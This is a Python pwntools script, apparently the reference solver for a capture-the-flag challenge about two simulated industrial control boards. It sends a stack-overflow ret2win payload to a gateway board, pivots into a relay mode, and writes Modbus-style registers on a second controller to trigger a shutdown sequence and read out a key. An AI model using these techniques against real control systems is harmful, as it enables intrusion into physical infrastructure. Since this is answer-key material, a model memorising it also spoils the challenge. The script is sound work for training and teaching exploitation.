#!/usr/bin/env python3
# Overburden: Master Loop — reference solver.
#
# Board A (gateway) has a stack overflow -> ret2win into enter_relay_mode(), which
# pipes you transparently to Board B (the extraction master, a BLACK BOX). Then you
# drive B's process to SAFE to release the key. There is NO flag in A, and B is
# never handed out -- so this is unsolvable from the firmware file alone.
from pwn import *

HOST, PORT = args.HOST or 'localhost', int(args.PORT or 9000)
RELAY  = 0x401435    # enter_relay_mode in Board A (stripped; found via RE)
OFFSET = 88          # buf(rbp-0x50) -> saved RIP

# Board B register map (recovered by observing A's telemetry + probing B live)
R_PRESSURE, R_TEMP, R_VENT, R_COOLANT, R_PUMP, R_MODE, R_ARM = range(7)

def frame(cmd, payload=b''):
    return b'RP' + p8(cmd) + p16(len(payload), endian='big') + payload

io = remote(HOST, PORT)
io.send(frame(0x10)); log.info('A: %s', io.recvline().strip().decode())
io.send(frame(0x20)); log.info('telemetry via A: %s', io.recvline().strip().decode())

# PIVOT: overflow -> ret2win(enter_relay_mode) -> now wired straight to Board B
io.send(frame(0x30, b'TG' + b'A' * OFFSET + p64(RELAY)))
io.recvuntil(b'tag written\n')

def mb_wr(a, v): io.send(b'MB' + b'W' + p8(a) + p16(v, endian='big')); return io.recvn(1)[0]
def mb_rd(a):    io.send(b'MB' + b'R' + p8(a)); return u16(io.recvn(2), endian='big')

# Safe-shutdown sequence, polling live telemetry between interlocked steps.
mb_wr(R_ARM, 1)                          # request maintenance mode
mb_wr(R_VENT, 1)                         # bleed pressure...
while mb_rd(R_PRESSURE) >= 200: pass     # ...until safe
mb_wr(R_COOLANT, 1)                      # cool the loop...
while mb_rd(R_TEMP) >= 80: pass          # ...until safe
assert mb_wr(R_PUMP, 0) == 0x00, 'interlock trip — sequence/order wrong'

io.send(b'MB' + b'K')                    # read the maintenance key
print('FLAG:', io.recvline().strip().decode())
io.close()
